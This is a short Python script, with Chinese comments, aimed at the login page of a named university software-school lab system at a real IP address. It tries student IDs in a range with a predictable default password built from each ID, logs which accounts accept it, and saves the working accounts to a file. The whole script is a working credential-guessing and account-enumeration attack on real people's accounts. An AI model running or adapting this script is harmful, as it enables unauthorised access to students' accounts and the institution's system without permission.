"""
逆向工程提交表单
南阳理工学院软件学院实验系统，'http://61.163.231.194:8080/Lab2.0/'
"""
import requests
import time

def judge(start, end):
	url = 'http://61.163.231.194:8080/Lab2.0/Login.action'
	# 定义空列表用来存放可以登录的数据
	user = []

	for i in range(start,end+1):
		params = {
			'userid': '1615925' + str(i),
			'password': '1615925' + str(i) + '#lab2018',
			'quan': 'Student'
		}

		html = requests.post(url, params)
		# print(html.text)
		# print(type(html.text))
		
		if html.text == '"3"':
			user.append(params['userid'])
			print("账号{}可用！".format(params['userid']))
		else:
			print("账号{}不可用！".format(params['userid']))
		time.sleep(3)

	# 将可用账号信息写入文件
	with open(r'使用密码默认账户.txt', 'w') as f:
		for u in user:
			f.write(u + '\n')
		print('存储完毕！')
	
	# print(html.text)
	

if __name__ == '__main__':
	# start，end表示开始和结束账号区间
	start = 200
	end = 300
	judge(start, end)